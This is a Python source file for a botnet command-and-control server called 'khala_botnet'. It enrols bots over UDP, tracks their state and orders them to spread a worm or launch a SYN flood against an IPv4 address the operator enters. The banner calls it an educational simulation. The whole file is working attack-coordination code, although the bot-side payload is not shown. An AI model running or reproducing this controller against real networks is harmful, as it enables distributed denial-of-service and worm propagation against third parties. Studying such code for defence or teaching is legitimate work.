import socket
import logging
import threading
import itertools
import os

PORT = 1337
BOT_STATES = {}   # k = bot address, v = bot state
''' STATES
0   up and waiting
1   enrolled and ready to attack
2   busy attacking
'''

logging.basicConfig(level=logging.INFO,
        format='%(asctime)s PID:%(process)d %(message)s',
        datefmt='%H:%M:%S',
        filename='/tmp/cnc.log')
logger = logging.getLogger('')

####################
#                  #
# SERVER MAIN LOOP #
#                  #
####################
def server_cmd():
    """ Obtains user input and parses the commands to perform botnet
    administrative duty, determine attack properties, etc.
    """
    print_banner()
    print_menu()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # main server command loop
    while True:
        try:
            user_input = raw_input('\033[1m' + 'khala_botnet$ ' + '\033[0m')
        except KeyboardInterrupt:   # kill process if kb interrupt
            sock.close()
            os.kill(os.getpid(), 9)

        tokens = user_input.split(' ')
        command = tokens[0].lower()

        if command == 'roll':
            roll_command(sock)

        elif command == 'attack':
            if len(tokens) == 3:
                attack_command(sock, tokens[1], tokens[2])
            else:
                print("Invalid command. Enter 'help' for options.")

        elif command == 'stop':
            stop_command(sock)

        elif command == 'list':
            list_bots()

        elif command == 'help':
            print_help()

        elif command == 'exit':
            sock.close()
            os.kill(os.getpid(), 9)
        else:
            print("Invalid command. Enter 'help' for options.")


############################
#                          #
# BOTNET COMMAND FUNCTIONS #
#                          #
############################
def attack_command(s, atck_type=None, victim_ip=None):
    """ Depending on the attack type parameter, spread the worm or perform
    a SYN-FLOOD attack on specified address.
    """
    global BOT_STATES
    global PORT
    valid_attack = {
        '0' : 'spread worm',
        '1' : 'syn flood'
    }

    # Validate user input options
    if not atck_type or not victim_ip:
        print("Invalid input. Enter 'help for options.")
        return
    if atck_type not in valid_attack:
        print("Invalid attack type. Enter 'help' for options.")
        return
    try:
        socket.inet_aton(victim_ip)
    except socket.error as error:
        print("Invalid IPv4 address. Reason: {}".format(error))
        return

    logger.info("Starting {} on {}".format(valid_attack[atck_type], victim_ip))

    for addr in BOT_STATES.keys():
        if BOT_STATES[addr] == 1:
            logger.info("\tCommand sent to {}".format(addr))
            s.sendto("ATCK::{}::{}".format(atck_type, victim_ip), (addr, PORT))
            BOT_STATES[addr] = 2

def stop_command(s):
    """ Send a 'STOP' message to all enrolled bots and reset states to ready.
    """
    global BOT_STATES
    logger.info("Sending STOP")
    print("Sending STOP to all BUSY bots.")
    for addr in BOT_STATES.keys():
        if BOT_STATES[addr] == 2:
            s.sendto('STOP', (addr, PORT))
            logger.info("Sent STOP to {}".format(addr))
            print("Sent STOP to {}".format(addr))
            BOT_STATES[addr] = 0
    print("STOP messages sent.")


def roll_command(s):
    """ Check in on status of bots. Sends the bots a ROLL message where they
    respond with their states.
    """
    for addr in BOT_STATES.keys():
        s.sendto('ROLL', (addr, PORT))
        print('ROLL sent to {}'.format(addr))
    logger.info('All bot statuses updated.')


def list_bots():
    """ List bots characterized by their current state.
    """
    bot_count = len(BOT_STATES)
    idle = []
    ready = []
    busy = []
    
    for addr in BOT_STATES.keys():
        if BOT_STATES[addr] == 0:
            idle.append(addr)
        elif BOT_STATES[addr] == 1:
            ready.append(addr)
        elif BOT_STATES[addr] == 2:
            busy.append(addr)

    print("IDLE ({})\n{}".format(len(idle), idle))
    print("READY ({})\n{}".format(len(ready), ready))
    print("BUSY ({})\n{}".format(len(busy), busy))


def bot_listener():
    """ Listens on specified port for bot responses, adds bots if not
    enrolled, and updates their states.
    Possible responses:
        1. 'HELO' - Provides server with notification to keep bot enrolled.
        2. 'REDY' - Bot state informs server that it's ready for commands.
        3. 'BUSY' - Bot state informs server that it's currently attacking.
    """
    global BOT_STATES
    global PORT

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', PORT))

    while True:
        bot_resp, client_addr = sock.recvfrom(1024)

        if bot_resp == 'HELO':
            logger.info("Received 'HELO' from: {}".format(client_addr))
            if client_addr[0] not in BOT_STATES.keys():
                BOT_STATES[client_addr[0]] = 0 # sets -1 for unintialized state

        elif bot_resp == 'REDY':
            BOT_STATES[client_addr[0]] = 1
            logger.info("Received 'REDY' from: {}".format(client_addr))

        elif bot_resp == 'BUSY':
            BOT_STATES[client_addr[0]] = 2
            logger.info("Received 'BUSY' from {}".format(client_addr))


########################
#                      #
# EXTRANEOUS FUNCTIONS #
#                      #
########################
def print_menu():
    print("""
\033[1mOPTIONS:\033[0m
    \033[1mroll\033[0m
    \033[1mstop\033[0m
    \033[1mattack <attack type> <victim ip>\033[0m
    \033[1mlist\033[0m
    \033[1mhelp\033[0m
    \033[1mexit\033[0m
    """)

def print_help():
    print("""
\033[1musage:\033[0m command <type> <victim>

\033[1mcommands:\033[0m
    roll
        Check on status of enrolled bots and add those not already enrolled.
    stop
        Stop all current attacks and reset bot states to ready.
    attack <attack type> <victim ip>
        <attack type> - 0 or 1 where 0 = spread worm and 1 = SYN-FLOOD
        <victim ip> - valid IPv4 address of victim.
    list
        Show bots that are ready, busy, and number of bots enrolled.
    help
    exit
    """)

def print_banner():
    print("""\033[36m ____  __.__           .__           __________        __                 __
|    |/ _|  |__ _____  |  | _____    \______   \ _____/  |_  ____   _____/  |_
|      < |  |  \\\\__  \\ |  | \\__  \\    |    |  _//  _ \\   __\\/    \\_/ __ \\   __\\
|    |  \|   Y  \/ __ \|  |__/ __ \_  |    |   (  <_> )  | |   |  \  ___/|  |
|____|__ \___|  (____  /____(____  /  |______  /\____/|__| |___|  /\___  >__|
        \/    \/     \/          \/          \/                 \/     \/
\033[0m
Simple botnet implementation to simulate distributed SYN-FLOOD attacks for educational purposes only.""")


####################
#                  #
# DRIVER FUNCTIONS #
#                  #
####################
def server_driver():
    threading.Thread(target=bot_listener).start()
    threading.Thread(target=server_cmd).start()

if __name__ == '__main__':
    server_driver()
